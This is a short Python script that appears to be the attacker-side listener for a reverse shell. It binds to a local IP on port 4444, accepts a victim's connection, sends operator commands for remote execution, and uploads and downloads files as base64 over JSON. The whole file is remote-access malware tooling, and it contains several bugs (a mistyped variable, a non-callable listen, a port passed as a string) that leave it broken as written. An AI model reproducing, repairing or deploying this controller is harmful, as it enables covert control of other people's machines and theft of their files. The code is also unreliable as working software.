import socket,json,base64
import termcolor
class Listener:
    def __init__(self,ip,port):
        listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1) #modify socket
        listener.bind((ip,port))

        listener.listen[0]
        print("[+] Waiting for incoming connection")
        self.connection,address=listener.accept()
        print("[+] Got a connection from "+str(address))
    def reliable_send(self,data):
        json_data=json.dumps(data)
        self.connection.send(json_data)
    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue
    def write_file(self,path,content):
        with open(path,"wb") as output:
            output.write(base64.b64decode(content))
            output.close()
    def read_file(self,path):
        with open(path,"rb") as input:
            content=input.read()
            input.close()
            return base64.b64encode(content)
    def exc_remote(self,command):
        self.reliable_send(command)
        if command[0] =="exit":
            self.connection.close()
            exit()

        return self.reliable_recv()
    def run(self):
        while True:
            cmd = input(">> ")
            cmd = cmd.split(" ")
            try:
                if cmd[0] == "upload":
                    contents=self.read_file(cmd[1])
                    cmd.append(contens)
                result = self.exc_remote(cmd)
                if cmd[0] == "download" and "[-] Error" not in result:
                    self.write_file(cmd[1],result)
                    print("[+] download successful")
            except Exception as msg:
                result = "[-] Error in during executing command\n"+msg
            if "successful" in result:
                termcolor.cprint(result,"green")
            else:
                print(result)




my_listener = Listener("192.168.1.11","4444")
my_listener.run()
